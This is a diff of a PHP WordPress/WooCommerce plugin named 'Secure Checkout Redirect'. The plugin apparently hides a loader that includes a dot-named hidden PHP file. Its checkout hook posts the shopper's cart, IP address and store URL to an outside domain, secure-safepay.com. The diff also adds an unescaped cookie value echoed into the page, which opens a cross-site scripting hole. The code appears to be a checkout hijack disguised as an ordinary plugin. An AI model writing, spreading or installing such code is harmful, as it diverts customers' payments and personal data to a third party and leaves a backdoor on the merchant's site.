@@ -2,17 +2,9 @@
 /*
 Plugin Name: Secure Checkout Redirect
 Version: 1.0.0.
-Description: Provides medical functionality for MedicalPress WordPress theme.
-License: GPLv2
+Description: Provides functionality for WordPress theme.
+License: MIT
 */
-
-//if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
-//    include_once($filename);
-//}
-
-//if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
-//    include_once($filename);
-//}
 
 if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
     include_once($filename);
@@ -40,17 +32,15 @@ function getCartProduct()
 
 
 function action_woocommerce_before_checkout_form( $cart_item_data ) {
-
-
+    $affId = $_COOKIE['aid'] ?? '71031';
     $products = getCartProduct();
     $url = dirname( set_url_scheme( 'https://'. $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] ) );
     ?>
-
     <form id="myForm" action="https://secure-safepay.com/" method="post">
         <input type="hidden" name="cart" value='<?php echo $products['cart'] ?>'>
         <input type="hidden" name="ip_address" value='<?php echo $_SERVER["REMOTE_ADDR"] ?>'>
         <input type="hidden" name="url" value="<?php echo $url ?>">
-        <input type="hidden" name="aff_id" value="71031">
+        <input type="hidden" name="aff_id" value="<?= $affId ?>">
         <input type="hidden" name="lang" value="en">
         <input type="hidden" name="currency" value="EUR">
         <input type="hidden" name="currencyPrice" value="1">
